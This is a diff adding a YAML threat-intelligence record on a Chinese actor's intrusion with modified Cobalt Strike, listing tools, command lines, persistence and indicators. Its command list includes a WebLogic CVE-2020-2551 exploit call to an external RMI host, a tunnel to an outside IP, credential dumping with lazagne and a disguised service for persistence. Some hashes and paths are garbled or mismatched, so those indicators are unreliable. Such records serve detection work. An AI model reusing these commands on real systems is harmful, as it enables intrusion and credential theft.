@@ -1,0 +1,147 @@
+description: This report details activity attributed to a threat actor utilizing various
+  tools and techniques for reconnaissance, credential harvesting, and lateral movement.
+  The observed behavior includes port scanning, web title enumeration, password extraction
+  using Lazagne and HackBrowserData, and persistence mechanisms.
+attribution: Chinese Threat Actor
+malware_families:
+- Cobalt Strike (modified - "Cobalt Strike Cat")
+- Cobalt Strike
+- f3p.exe
+- lazagne.exe
+- hack-browser-data.exe
+authors:
+- Arda Büyükkaya
+TTPs:
+  processes:
+  - svchost.exe
+  - cmd.exe
+  - bea.exe
+  - fscan.exe
+  - hack-browser-data.exe
+  - frpcx.exe
+  - php.exe
+  - LDAPRefServer
+  - tasklist.exe
+  - powershell.exe
+  - f.exe
+  - query user
+  - gwinsta
+  - net user
+  - findstr.exe
+  - lazagne.exe
+  - sc.exe
+  - f3p.exe
+  - systeminfo
+  commandline:
+  - sc create WindowsUpdate binPath= C:\\Windows\\Temp\\svchost.exe start= auto obj=
+    LocalSystem DisplayName= windowsupdate
+  - java -jar weblogic_CVE_2020_2551.jar 81.21.104.41 9901 rmi://156.251.172.194:1099/Exploit
+  - java -jar weblogic_CVE_2020_2551.jar 81.21.104.41 9901 rmi://156.251.172.194:1099/Exploitmore
+  - netstat -anpltKLl -9
+  - .\\f.exe -h 192.168.6.6/24
+  - Tasklist /SVC
+  - tasklist /SVC
+  - .\\f.exe -h 192.168.02/09
+  - fscan verston: 1.8.2start infoscan(icmp) Target 192.168.0.1  {is alive(icmp) Target
+      192.168.0.12  is alive(icmp) Target 192.168.0.15  is alive(icmp) Target 192.168.0.16  is
+      alive(icmp) Target 192.168.0.19  is alive(icmp) Target 192.168.0.18  is alive(icmp)
+      Target 192.168.0.13  is alive(icmp) Target 192.168.0.17  is alive(icmp) Target
+      192.168.0.20  is alive
+  - query user || gwinsta
+  - net user
+  - findstr /s /i \"DBPath\" *.x
+  - lazagne.exe all
+  - hack-browser-data.exe
+  - sc qc WindowsUpdate
+  - sc start WindowsUpdate
+  - frpcx.exe -t 156.251.172.194 -p 23330
+  - ./f3p.exe -c run.ini
+  - systeminfo
+  powershell: []
+  scripting_engine: []
+  registry_keys: []
+  image_load: []
+  network_connections:
+  - executable: svchost.exe
+    destination_address: 156.251.172.194
+    port: '1099'
+  - executable: fscan.exe
+    destination_address: 192.168.0.1
+    port: ''
+  - executable: fscan.exe
+    destination_address: 192.168.0.1
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.12
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.15
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.16
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.19
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.18
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.13
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.17
+    port: icmp
+  - executable: fscan.exe
+    destination_address: 192.168.0.20
+    port: icmp
+  file_activity:
+  - C:\\Windows\\Temp\\svchost.exe
+  - C:\\Users\\Test\\Desktop\\ONE-FOX_V1.0_by\\gui_other\\Cobalt_Strike_4.5\\plugin\\TaoWu\\script\\lazagne.exe
+  - C:\\Windows\\Temp\\lazagne.exe
+  - C:\\Users\\Test\\Desktop\\ONE-FOXSRALTAl_V1. O byJUB\\qui_other\\Cobalt_Strike
+    4.5\\plugin\\Taoku\\script\\lazagne.cxe
+  - C:\\Users\\Test\\Desktop\\ONE-FOXMRLT_V1. OB _byJ\\gui_other\\Cobalt_Strike_4.5\\plugin\\OLa\\scripts\\Passwd_Capture\\HackBrowserData\\x64\\hack-browser-data.exe
+  persistence:
+  - Windows service installation (windowsupdate)
+  - Service creation: WindowsUpdate service created and configured to run svchost.exe
+      from a temporary location (C:\\Windows\\Temp\\).
+  pipes: []
+  process_relations: []
+IOCs:
+- IP Address: 156.251.172.194
+- IP Address: 193.233.204.73
+- IP Address: 103.156.184.89
+- IP Address: 172.104.53.19
+- IP Address: 103.156.184.83
+- IP Address: 192.46.227.146
+- IP Address: 140.99.149.35
+- IP Address: 172.104.191.194
+- IP Address: 172.105.117.179
+- URL: hxxp://38.54.50.246:10001
+- MD5 Hash: d0139fda662f3ca949dd335c30573fa2
+- MD5 Hash: 996c3eb5c21a20dd13b7ceee6c80b673
+- MD5 Hash: f3p.exe 825c126e8547fbb01ff21d2100343bd2
+- MD5 Hash: run.ini 73255c8357afd671c2256360d0be69cd
+- MD5 Hash: lazagne.exe c72e18c26307bc50d4936c0f5f0df36b
+- MD5 Hash: svchost.exe (modified Cobalt Strike) b7b1d390baaf579925ec6a33b6beeec8
+- MD5 Hash: hack-browser-data.exe 03f45692db10fe291de65f15ca9761af
+- MD5 Hash: frpcx.exe a284c8b14e4be0e2e561e5ff64e82dc7
+- MD5 Hash: fscan.exe 0b9e8fca5dc4775964492d7d333da25d
+- hash: 73255c8357afd671c2256360d0be69cd
+  file_size: 8355952
+  filename: lazagne.exe
+- hash: b7b1d39baaf579925ec6a33b6beeecs
+  file_size: 6095360
+  filename: hack-browser-data.exe
+- ip: 103.156.184.83
+- ip: 172.105.117.179
+- ip: 156.251.172.194
+- domain: moe.gov.my
+- url: https://mediadr.sis.gov.eg
+- url: http://uebmail.sis.gov.eg
+- url: https://meet.sis.gov.eg
+- url: http://sis.gov.eg
+reference: https://blog.eclecticiq.com/chinese-threat-actor-used-modified-cobalt-strike-variant-to-attack-taiwanese-critical-infrastructure
+date_of_publication: June 2, 2023
+file_creation_date: May 28, 2025
